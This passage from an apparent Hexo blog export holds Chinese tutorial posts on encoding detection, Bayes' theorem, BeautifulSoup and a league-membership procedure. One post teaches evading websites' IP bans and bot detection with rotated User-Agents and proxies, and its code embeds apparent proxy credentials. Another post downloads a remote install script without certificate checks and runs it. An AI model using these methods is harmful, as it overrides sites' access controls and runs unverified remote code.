7%E7%A5%9E/"}]},{"title":"爬虫字符集问题","slug":"爬虫字符集问题","date":"2021-09-11T02:16:18.000Z","updated":"2024-07-30T11:26:33.937Z","comments":true,"path":"2021/09/11/爬虫字符集问题/","permalink":"http://enderxiao.github.io/2021/09/11/%E7%88%AC%E8%99%AB%E5%AD%97%E7%AC%A6%E9%9B%86%E9%97%AE%E9%A2%98/","excerpt":"关于爬虫字符集不匹配问题的解决办法","text":"关于爬虫字符集不匹配问题的解决办法 背景 由于世界上语言各异，进行信息爬取的过程中，难免遇到各种各样奇怪的字符，导致我们进行持久化时遇到困难。 今天在写爬虫时就遇到了一个’gbk’编码集无法解析的字符：‘\\u2022’ 该字符使用正确编码时，在显示器上显示的应为•然而我们先要知道该字符是来自于哪一字符集较为困难，那有没有什么直接使用原网页字符集的方法呢？ 查看原网页字符集 查看原网站编码集的方法有很多，比如通过console输入： 1document.charset //&#x27;GBK&#x27; 或者直接查看网页的如下标签： 1&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=gbk&quot;&gt; 然而这通常只能知道该网页是使用某种gbk编码编制的。让然不够准确，而且需要我么切到浏览器进行操作，这有可能打断我们编码的思路。 chardet模块 另一种更好的方法是使用python的chardet库。 chardet为我们提供了一种网络资源编码方式自动检测的方案。 该模块的作者实际上是将Mozilla的自动编码检测技术封装成了接口 the auto-detection code in Mozilla 对原算法感兴趣的话可以阅读如下论文A composite approach to language/encoding detection (mozilla.org) detect() chardet最常用的使用方式就是： 12345&gt;&gt;&gt; import urllib.request&gt;&gt;&gt; rawdata = urllib.request.urlopen(&#x27;http://yahoo.co.jp/&#x27;).read()&gt;&gt;&gt; import chardet&gt;&gt;&gt; chardet.detect(rawdata)&#123;&#x27;encoding&#x27;: &#x27;EUC-JP&#x27;, &#x27;confidence&#x27;: 0.99&#125; 这样就能直接获取某一整篇文本的编码方式。 该方法接收一个non-Unicode字符串作为参数，并且返回该字符串最有可能使用的字符集，以及推测使用该字符集的概率confidence，该值是一个0-1之间的数。 UniversalDetector 而当我们面对一个非常长的文本时，直接传入正片文本会导致算法推断的事件过长。 试该接口为我们提供了一个UniversalDetector类，该类包含一个feed方法，接受一个字符串，用于推断，一个done属性，用于检测推断的字符集的置信度是否已经到达了推断的最低门槛，到达最低门槛时，该对象将会吧done值置为true 在分析完全部分当时，请调用close方法，因为该方法会进行最后的计算，以应对没有任何一个可能的字符集的置信度达到最低门槛的情况。 最后result属性将是一个包含了可能的字符集与置信度的dictionary 12345678910111213import urllib.requestfrom chardet.universaldetector import UniversalDetectorusock = urllib.request.urlopen(&#x27;http://yahoo.co.jp/&#x27;)detector = UniversalDetector()for line in usock.readlines(): detector.feed(line) if detector.done: breakdetector.close()usock.close()print(detector.result)# &#123;&#x27;encoding&#x27;: &#x27;EUC-JP&#x27;, &#x27;confidence&#x27;: 0.99&#125; 多文档分析 如果需要对多个文本进行字符集预测，则可以使用同一个UniversalDetector类，并在对每个文档进行预测前使用reset方法。 123456789101112import globfrom chardet.universaldetector import UniversalDetectordetector = UniversalDetector()for filename in glob.glob(&#x27;*.xml&#x27;): print(filename.ljust(60), end=&#x27;&#x27;) detector.reset() for line in open(filename, &#x27;rb&#x27;): detector.feed(line) if detector.done: break detector.close() print(detector.result)","categories":[{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/categories/Python/"},{"name":"爬虫","slug":"Python/爬虫","permalink":"http://enderxiao.github.io/categories/Python/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://enderxiao.github.io/tags/%E7%88%AC%E8%99%AB/"},{"name":"字符集","slug":"字符集","permalink":"http://enderxiao.github.io/tags/%E5%AD%97%E7%AC%A6%E9%9B%86/"},{"name":"chardet","slug":"chardet","permalink":"http://enderxiao.github.io/tags/chardet/"}]},{"title":"关于贝叶斯公式的理解","slug":"关于贝叶斯公式的理解","date":"2021-09-09T06:38:20.000Z","updated":"2024-07-30T11:26:33.923Z","comments":true,"path":"2021/09/09/关于贝叶斯公式的理解/","permalink":"http://enderxiao.github.io/2021/09/09/%E5%85%B3%E4%BA%8E%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%85%AC%E5%BC%8F%E7%9A%84%E7%90%86%E8%A7%A3/","excerpt":"记录学习过程中关于贝叶斯公式的理解","text":"记录学习过程中关于贝叶斯公式的理解 背景 今天在学习对数几率回归的过程中用到了极大似然法，在了解极大似然法的过程中又需要我们对贝叶斯公式做出更深刻的理解，因此，决定重新认识一下我们的好朋友贝叶斯公式： P(A∣Bi)=P(Bi)P(A∣Bi)∑j=1nP(Bj)P(A∣Bj)(i=1,2,…,n)P(A|B_i) = \\frac{P(B_i)P(A|B_i)}{\\sum_{j = 1}^nP(B_j)P(A|B_j)}(i = 1,2,\\dots,n) P(A∣Bi​)=∑j=1n​P(Bj​)P(A∣Bj​)P(Bi​)P(A∣Bi​)​(i=1,2,…,n) 回顾 理解贝叶斯公式，首先需要回顾一下几个著名公式 条件概率公式 P(B∣A)=P(AB)P(A)P(B|A) = \\frac{P(AB)}{P(A)} P(B∣A)=P(A)P(AB)​ 这一公式的理解起初也遇到了一些困难，但是通过绘制韦恩图得到了解决： hqqsyt.png 对于如上这一图示，用S表示面积，例如C的面积为S(C)S(C)S(C)，那么P(A∣B)P(A|B)P(A∣B)则可以表示为，A占B的面积百分比，及P(A∣B)=S(C)S(B)P(A|B)= \\frac{S(C)}{S(B)}P(A∣B)=S(B)S(C)​，而P(B)P(B)P(B)则可表示为B占总体S的面积百分比，也就是P(B)=S(B)S(S)P(B) = \\frac{S(B)}{S(S)}P(B)=S(S)S(B)​，那么我们要求的也就是P(C)P(C)P(C)，即C占S的面积百分比，显然可以使用P(A∣B)×P(B)P(A|B)\\times P(B)P(A∣B)×P(B)的到，于是我们就得到了公式P(AB)=P(A∣B)×P(B)P(AB) = P(A|B) \\times P(B)P(AB)=P(A∣B)×P(B)，当B事件不为不可能事件时，即可得到条件概率公式。 全概率公式 全概率公式所描述的则是对于一个样本空间S的完备事件组，即： A1∪A2∪⋯∪An=SA_1 \\cup A_2 \\cup \\dots\\cup A_n = S A1​∪A2​∪⋯∪An​=S Ai∩Aj=∅(i≠j)A_i \\cap A_j = \\emptyset (i \\neq j) Ai​∩Aj​=∅(i=j) 有 P(A)=∑i=1nP(Bi)P(A∣Bi)P(A) = \\sum_{i = 1}^nP(B_i)P(A|B_i) P(A)=i=1∑n​P(Bi​)P(A∣Bi​) 全概率公式讨论的是这样一种情况： 时间A的发生有各种可能的原因BiB_iBi​。如果A是由原因BiB_iBi​引起，则A发生的概率为全概率公式中的一项。每一个原因都可能导致A发生。故A发生的概率是全部原因引起A发生的概率的总和，即为全概率公式。 由此我们可以把全概率公式看成是由原因推结果的公式，每个原因对结果的发生有一定的作用，结果发生的可能性与各种原因的作用大小有关，全概率公式就表达了它们的关系。 贝叶斯公式 P(A∣Bi)=P(Bi)P(A∣Bi)∑j=1nP(Bj)P(A∣Bj)(i=1,2,…,n)P(A|B_i) = \\frac{P(B_i)P(A|B_i)}{\\sum_{j = 1}^nP(B_j)P(A|B_j)}(i = 1,2,\\dots,n) P(A∣Bi​)=∑j=1n​P(Bj​)P(A∣Bj​)P(Bi​)P(A∣Bi​)​(i=1,2,…,n) 贝叶斯公式便是由如上的两个公式推论而来,那么我们又该如何理解贝叶斯公式呢 事实上贝叶斯公式所表述的是一个在A事件已经发生的条件下,寻找导致A发生各种“原因”BiB_iBi​的概率. 先验概率与后验概率 所谓先验概率与后验概率,通俗的理解就是: 由以往的数据分析所得的称为先验概率 得到某些信息之后重新加以修正的概率成为后验概率 下面通过一个例子来理解: 设机器调整良好时,产品合格率为95%,机器不良时合格率为50%.已知机器良好率为90%.现在已知某日生产的一件产品为合格品,求机器为良好的概率 我们使用: A事件表示:”产品合格” 用B事件表示“机器良好” 那么根据该题建立数学模型为: 已知: P(B)=0.9P(Bˉ)=0.1P(A∣B)=0.95P(A∣Bˉ)=0.5P(B) = 0.9\\\\ P(\\bar B) = 0.1 \\\\ P(A|B) = 0.95 \\\\ P(A|\\bar B) = 0.5 P(B)=0.9P(Bˉ)=0.1P(A∣B)=0.95P(A∣Bˉ)=0.5 求P(B∣A)P(B|A)P(B∣A) 相信使用贝叶斯公式很快就能解出P(B∣A)≈0.945P(B|A) \\approx 0.945P(B∣A)≈0.945 那么在这个例子中: 机器良好的概率P(B)=0.9P(B) = 0.9P(B)=0.9为先验概率 条件概率P(B∣A)≈0.945P(B|A) \\approx 0.945P(B∣A)≈0.945为后验概率 知道了先验和后验之后,我们再次来看看贝叶斯公式的另一形式: P(A∣B)=P(B∣A)P(A)P(B)P(A|B) = \\frac{P(B|A)P(A)}{P(B)} P(A∣B)=P(B)P(B∣A)P(A)​ 其中P(A)P(A)P(A)和P(B)P(B)P(B)就是我们通常认为的先验概率(Prior Probability),而P(A∣B)P(A|B)P(A∣B)就是我们认为的后验概率(Posterior Probability). 而用于计算的P(B∣A)P(B|A)P(B∣A)我们称之为可能性(Likelihood) 总结 概率,数学在机器学习的应用中非常之多,考研阶段学习数学,往往只在意这个公式或者结论的推导过程,解题方法.而忽视了这个公式或者结论对现实的指导意义. 我认为数学应该是一门值得我们用一生去学习,温习的科目.在如今需要正儿八经的使用数学的阶段,应该把学习数学的思路进行转变. 参考文献 条件概率公式图解推导_平原的博客-CSDN博客_条件概率公式推导 全概率公式、贝叶斯公式 - 知乎 (zhihu.com) 详解最大似然估计（MLE）、最大后验概率估计（MAP），以及贝叶斯公式的理解_nebulaf91的博客-CSDN博客_最大后验估计","categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"http://enderxiao.github.io/categories/Machine-Learning/"},{"name":"机器学习入门","slug":"Machine-Learning/机器学习入门","permalink":"http://enderxiao.github.io/categories/Machine-Learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"},{"name":"概率论","slug":"概率论","permalink":"http://enderxiao.github.io/categories/%E6%A6%82%E7%8E%87%E8%AE%BA/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"http://enderxiao.github.io/tags/Machine-Learning/"},{"name":"概率论","slug":"概率论","permalink":"http://enderxiao.github.io/tags/%E6%A6%82%E7%8E%87%E8%AE%BA/"},{"name":"贝叶斯公式","slug":"贝叶斯公式","permalink":"http://enderxiao.github.io/tags/%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%85%AC%E5%BC%8F/"},{"name":"先验概率","slug":"先验概率","permalink":"http://enderxiao.github.io/tags/%E5%85%88%E9%AA%8C%E6%A6%82%E7%8E%87/"}]},{"title":"反爬虫","slug":"反爬虫","date":"2021-09-08T07:11:55.000Z","updated":"2024-07-30T11:26:33.931Z","comments":true,"path":"2021/09/08/反爬虫/","permalink":"http://enderxiao.github.io/2021/09/08/%E5%8F%8D%E7%88%AC%E8%99%AB/","excerpt":"反爬虫机制说明","text":"反爬虫机制说明 背景 近期在学习爬虫的过程中遇到了一个问题： 我使用Requests+BeautifulSoup制作了一个爬取目标网站： 陕西省教育厅教育要闻 的全部新闻标题以及URL 但是在爬取的过程中遇到了这样的问题，那就是我的ip被网站封禁了。 这才意识到原来各大网站还有反爬虫机制这回事。 为此，需要总结一些应对网站反爬虫机制的方法，主要参考自：避免网络爬虫IP被封的策略 - 王陸 - 博客园 (cnblogs.com) User_agent伪装与轮换 user_agent简介 不同浏览器，不同内核版本在进行Http请求时，会在请求头中使用不同的User_agent字段。有些网站会根据请求头中的这些信息来判断是不是有爬虫正在无情的爬取网页的数据。 类似的还有使用referer字段进行检测的。 对于这些简单的反爬虫机制，我们只需要伪装正常的请求头就能解决问题。 对于user_agent的检测，我们可以简单粗暴的使用一个user_agent列表，每次从中随机的提取出一个来构造请求即可，这里我们构造了一个用于产生随机user_agent的工具类： 123456789101112131415161718192021222324252627282930313233343536373839404142434445class UserAgentUtils(object): __UserAgentList = [ &quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&quot;, &quot;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko&quot;, &quot;Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;, &quot;Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0&quot;, &quot;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)&quot;, &quot;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)&quot;, &quot;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)&quot;, &quot;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)&quot;, &quot;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)&quot;, &quot;Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.28.3 (KHTML, like Gecko) Version/3.2.3 ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/525.28.3&quot;, &quot;Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16&quot;, &quot;Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14&quot;, &quot;Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14&quot;, &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14&quot;, &quot;Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02&quot;, &quot;Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00&quot;, &quot;Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00&quot;, &quot;Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00&quot;, &quot;Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1&quot;, &quot;Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0&quot;, &quot;Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0&quot;, &quot;Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0&quot;, ] def __init__(self): super.__init__() @classmethod def getRadomUserAgent(self): max = 30 min = 0 index = random.randint(min, max) print(index) return self.__UserAgentList[index] 使用代理IP和轮换 有些反爬虫机制比较严格的网站，比如拉勾网，它们的机制大致就是： 在没有登录的情况下，程序只能连续访问 3 个 Url。如果再继续访问，网站会将链接重定向，然后提示我们登录。 如果在登录情况下，连续请求部分 url 之后，我们的 IP 会被封。 对于这类直接检测IP并进行封禁的网站，则需要使用IP代理池来突破。 代理按匿名度区分有如下三种： 透明代理：目标网站知道你使用了代理并且知道你的源IP地址，这种代理显然不符合我们这里使用代理的初衷 匿名代理：匿名程度比较低，也就是网站知道你使用了代理，但是并不知道你的源IP地址 高匿代理：这是最保险的方式，目标网站既不知道你使用的代理更不知道你的源IP 代理的获取方式可以去购买，当然也可以去自己爬取免费的。 通常免费代理不够稳定。 不使用代理 首先，不是用代理IP的情况如下： 123456789import requestsurl = &#x27;http://icanhazip.com&#x27;try: response = requests.get(url) #不使用代理 print(response.status_code) if response.status_code == 200: print(response.text)except requests.ConnectionError as e: print(e.args) 运行上面的程序，会返回我们电脑本机的 IP，可以通过百度查询 IP 地址对比一下就知道了。 12200124.238.223.xxx # 后三位隐去了 使用代理 常见的代理包括 HTTP 代理和 SOCKS5 代理，前者可以找一些免费代理 IP 进行测试，由于我电脑上使用的是 Shadowsocks，所以就介绍一下 SOCKS5 代理的设置。 启动该软件后默认会在 1080 端口下创建 SOCKS5 代理服务，代理为：127.0.0.1:1080，然后我们在 Requests 中使用该代理，方法很简单只需要添加一项 proxies 参数即可： 1234567891011121314proxies = [ &#123;&#x27;http&#x27;:&#x27;socks5://127.0.0.1:1080&#x27;&#125;, &#123;&#x27;https&#x27;:&#x27;socks5://127.0.0.1:1080&#x27;&#125;]proxies = random.choice(proxies)print(proxies)url = &#x27;http://icanhazip.com&#x27;try: response = requests.get(url,proxies=proxies) #使用代理 print(response.status_code) if response.status_code == 200: print(response.text)except requests.ConnectionError as e: print(e.args) random 函数用来随机选择一个代理，我们来看一下结果： 123&#123;&#x27;http&#x27;: &#x27;socks5://127.0.0.1:1080&#x27;&#125;20045.78.42.xxx #xxx表示隐去了部分信息 可以看到，这里随机选择了 http 协议的代理后，返回的 IP 就不是真实的 IP 代理地址了，成功代理后就可以爬一些墙外的网页了。 延伸一下，假如随机选择的是 https 代理，那么返回的 IP 结果还一样么？我们尝试重复运行一下上面的程序： 123&#123;&#x27;https&#x27;: &#x27;socks5://127.0.0.1:1080&#x27;&#125;200124.238.223.xxx 可以看到这次使用了 https 代理，返回的 IP 却是本机的真实 IP，也就是说代理没有起作用。 进一步地，我们将 url 改为 https 协议 'https://icanhazip.com'，然后再尝试分别用 http 和 https 代理请求，查看一下结果： 123456789#http 请求&#123;&#x27;http&#x27;: &#x27;socks5://127.0.0.1:1080&#x27;&#125;200124.238.223.xxx#https 请求&#123;&#x27;https&#x27;: &#x27;socks5://127.0.0.1:1080&#x27;&#125;20045.78.42.xxx 可以看到，两种请求的结果和之前的刚好相反了，由于 url 采用了 https 协议，则起作用的是 https 代理，而 http 代理则不起作用了，所以显示的是本机 IP。 因此，可以得到这样的一个结论： HTTP 代理，只代理 HTTP 网站，对于 HTTPS 的网站不起作用，也就是说，用的是本机 IP。 HTTPS 代理则同理。 使用付费代理 上面，我们只使用了一个代理，而在爬虫中往往需要使用多个代理，那有如何构造呢，这里主要两种方法，一种是使用免费的多个 IP，一种是使用付费的 IP 代理，免费的 IP 往往效果不好，那么可以搭建 IP 代理池，但对新手来说搞一个 IP 代理池成本太高，如果只是个人平时玩玩爬虫，完全可以考虑付费 IP，几块钱买个几小时动态 IP，多数情况下都足够爬一个网站了。 这里推荐一个付费代理「阿布云代理」，最近使用了一下，效果非常不错，5 块钱买了 5个小时，爬完了一个网站，所以没有必要为了省 5 块钱，而费劲地去搞 IP 代理池。 首次使用的话，可以选择购买一个小时的动态版试用下，点击生成隧道代理信息作为凭证加入到代码中。 将信息复制到官方提供的 Requests 代码中，运行来查看一下代理 IP 的效果： 1234567891011121314151617181920212223242526272829import requests# 待测试目标网页targetUrl = &quot;http://icanhazip.com&quot;def get_proxies(): # 代理服务器 proxyHost = &quot;http-dyn.abuyun.com&quot; proxyPort = &quot;9020&quot; # 代理隧道验证信息 proxyUser = &quot;HS77K12Q77V4G9MD&quot; proxyPass = &quot;4131FFDFCE27F104&quot; proxyMeta = &quot;http://%(user)s:%(pass)s@%(host)s:%(port)s&quot; % &#123; &quot;host&quot; : proxyHost, &quot;port&quot; : proxyPort, &quot;user&quot; : proxyUser, &quot;pass&quot; : proxyPass, &#125; proxies = &#123; &quot;http&quot; : proxyMeta, &quot;https&quot; : proxyMeta, &#125; for i in range(1,6): resp = requests.get(targetUrl, proxies=proxies) # print(resp.status_code) print(&#x27;第%s次请求的IP为：%s&#x27;%(i,resp.text)) get_proxies() 可以看到每次请求都会使用不同的 IP，是不是很简单？比搞 IP 代理池省事多了。 设置访问时间间隔 很多网站的反爬虫机制都设置了访问间隔时间，一个IP如果短时间内超过了指定的次数就会进入“冷却CD”。甚至有些小网站经受不起如此高的并发度，以至于被我们写的不够好的爬虫爬宕机。 所以除了轮换IP和user_agent，还可以设置访问的时间间间隔长一点，比如没抓取一个页面休眠一个随机时间： 12import time，randomtime.sleep(random.random()*3) 对于一个crawler来说，这是一个比较responsible的做法。 因为本来爬虫就可能会给对方网站造成访问的负载压力，所以这种防范既可以从一定程度上防止被封，还可以降低对方的访问压力。 参考文献 爬代理ip 爬虫IP被禁的简单解决方法 - 木白的菜园 - 博客园 Python 爬虫的代理 IP 设置方法汇总 - 三度 - 博客园 爬虫与反爬虫的博弈 - 知乎 盘点一些网站的反爬虫机制 - 知乎 避免网络爬虫IP被封的策略 - 王陸 - 博客园","categories":[{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/categories/Python/"},{"name":"爬虫","slug":"Python/爬虫","permalink":"http://enderxiao.github.io/categories/Python/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://enderxiao.github.io/tags/%E7%88%AC%E8%99%AB/"},{"name":"bs4","slug":"bs4","permalink":"http://enderxiao.github.io/tags/bs4/"}]},{"title":"ss服务器搭建","slug":"ss服务器搭建","date":"2021-09-07T04:47:03.000Z","updated":"2024-07-30T11:26:33.921Z","comments":true,"path":"2021/09/07/ss服务器搭建/","permalink":"http://enderxiao.github.io/2021/09/07/ss%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/","excerpt":"记第一次搭建SS服务器","text":"记第一次搭建SS服务器 开始 进入了新的学校之后，终于注册到了一个EDU邮箱。要做的第一件事当然就是白嫖软件。 除了JetBrain家的全家桶以外，Github Pro中也包含大量的免费使用内容，Azure虚拟机就是其中之一。 Azure Azure的领取方式这里略过，直接去Azure官网用Github登录，在资源中创建一台虚拟机就行，创建时记得把http，https，ssh这些服务都选上。 选上后就能通过ssh客户端，或者命令行连接上主机了！ SS安装 接下来只需要在云端上安装SS服务即可，使用如下命令就能轻松安装： 12345wget --no-check-certificate -O shadowsocks.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.shchmod +x shadowsocks.sh./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log 执行命令后过一会提示你输入输入SS的密码，端口和加密方式 点回车之后会提示你让你再按一遍回车确定，然后出现ss信息，记得复制出来妥善保存。 到此ss的安装教程就结束了。 连接SS 接下来只需要在安装有支持ssr协议的app的计算机或移动设备上，添加我们的服务器就行了。","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"云服务器","slug":"云服务器","permalink":"http://enderxiao.github.io/categories/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"云服务器","slug":"云服务器","permalink":"http://enderxiao.github.io/tags/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"ss服务","slug":"ss服务","permalink":"http://enderxiao.github.io/tags/ss%E6%9C%8D%E5%8A%A1/"},{"name":"科学上网","slug":"科学上网","permalink":"http://enderxiao.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"name":"ShadowSocksR","slug":"ShadowSocksR","permalink":"http://enderxiao.github.io/tags/ShadowSocksR/"}]},{"title":"BJUT团组织关系转入","slug":"BJUT团组织关系转入","date":"2021-09-05T02:49:55.000Z","updated":"2024-07-30T11:26:33.905Z","comments":true,"path":"2021/09/05/BJUT团组织关系转入/","permalink":"http://enderxiao.github.io/2021/09/05/BJUT%E5%9B%A2%E7%BB%84%E7%BB%87%E5%85%B3%E7%B3%BB%E8%BD%AC%E5%85%A5/","excerpt":"硕士研究生团组织关系转入流程记录","text":"硕士研究生团组织关系转入流程记录 京外团员关系转移 转出团组织在京外的学生团员，因北京所使用系统与其他省市不同，需新生团员先由“智慧团建”系统申请转入“北京共青团”系统。 再在 9 日内完成“北京共青团”系统的注册登录。 新生团支书在“北京共青团”系统上收到转接申请后，应根据本支部人员名单，按照转接规范及时进行审核，确认无误后通过（详细步骤见附件 1） 京外智慧团建操作流程 智慧团建 在指挥团建上进行组织关系转入申请，如需转入北京共青团线上系统，则智慧团建中转入组织属于哪个省处应选择北京 转入组织名称为：中国共产主义青年团北京工业大学信息学部21计算机学硕团支部 北京共青团线上系统 完成转出申请后，需在9日内完成北京共青团线上系统的注册登陆，并在系统中通过组织审核，成为组织的正式成员。 操作步骤如下： 关注北京共青团官方微信公众号青春北京，点击右下方菜单线上系统中的北京共青团系统 点击创建账号进行账号注册 选择身份 输入准确姓名和身份证号 志愿北京注册 进入志愿北京网页 点击左上角志愿者注册 完成注册 选择服务领域（建议青年志愿者 社区志愿者） 注册成功后点左上角用户名进入用户中心 用户中心中选择修改资料部分 选择身份信息，填写 可以通过小程序志愿云服务主力辅助完成实名认证","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"硕士研究生","slug":"硕士研究生","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"硕士研究生","slug":"硕士研究生","permalink":"http://enderxiao.github.io/tags/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"共青团","slug":"共青团","permalink":"http://enderxiao.github.io/tags/%E5%85%B1%E9%9D%92%E5%9B%A2/"}]},{"title":"BeautifulSoup笔记","slug":"BeautifulSoup笔记","date":"2021-09-02T23:35:02.000Z","updated":"2024-07-30T11:26:33.905Z","comments":true,"path":"2021/09/03/BeautifulSoup笔记/","permalink":"http://enderxiao.github.io/2021/09/03/BeautifulSoup%E7%AC%94%E8%AE%B0/","excerpt":"BeautifulSoup4 学习笔记","text":"BeautifulSoup4 学习笔记 简介 Beautiful Soup是一款可以从HTML以及XML文件中提取数据的python库。 接下来的实验我们都将以一篇经典的案例为基础： 1234567891011121314151617181920212223242526272829303132# &lt;html&gt;# &lt;head&gt;# &lt;title&gt;# The Dormouse&#x27;s story# &lt;/title&gt;# &lt;/head&gt;# &lt;body&gt;# &lt;p class=&quot;title&quot;&gt;# &lt;b&gt;# The Dormouse&#x27;s story# &lt;/b&gt;# &lt;/p&gt;# &lt;p class=&quot;story&quot;&gt;# Once upon a time there were three little sisters; and their names were# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;# Elsie# &lt;/a&gt;# ,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;# Lacie# &lt;/a&gt;# and# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link2&quot;&gt;# Tillie# &lt;/a&gt;# ; and they lived at the bottom of a well.# &lt;/p&gt;# &lt;p class=&quot;story&quot;&gt;# ...# &lt;/p&gt;# &lt;/body&gt;# &lt;/html&gt; 开始 想要使用Beautiful Soup解析一段HTML文档，只需要用如下一段代码，得到一个BeautifulSoup对象，即可对改文档进行方便的操作： 12frome bs4 import BeautifulSoupsoup = BeautifulSoup(html_doc, &#x27;html.parser&#x27;) BeautifulSoup对象提供了一些简单的操作，能方便的提取出其中的一些内容： 1234567891011121314151617181920212223242526272829303132print(soup.prettify()) # 按照标准缩进格式化输出print(soup.title) # &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt; 该操纵会将第一个title标签下的所后代标签print(soup.title.name) # &#x27;title&#x27;print(soup.title.string) # &#x27;The Dormouse&#x27;s story&#x27;print(soup.title.parent.name) # &#x27;head&#x27;print(soup.p) # &lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;print(soup.p[&#x27;class&#x27;]) # titleprint(soup.fund_all(&#x27;a&#x27;))# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]print(soup.get_text()) # 从文档中获取所有文字内容# The Dormouse&#x27;s story## The Dormouse&#x27;s story## Once upon a time there were three little sisters; and their names were# Elsie,# Lacie and# Tillie;# and they lived at the bottom of a well.## ... 解析器 Beautiful Soup支持Python标准库中的HTML解析器,还支持一些第三方的解析器,其中一个是 lxml 。 另一个可供选择的解析器是纯Python实现的 html5lib ，html5lib的解析方式与浏览器相同。 下面是各种解析器的优缺点： 解析器 使用方法 优势 劣势 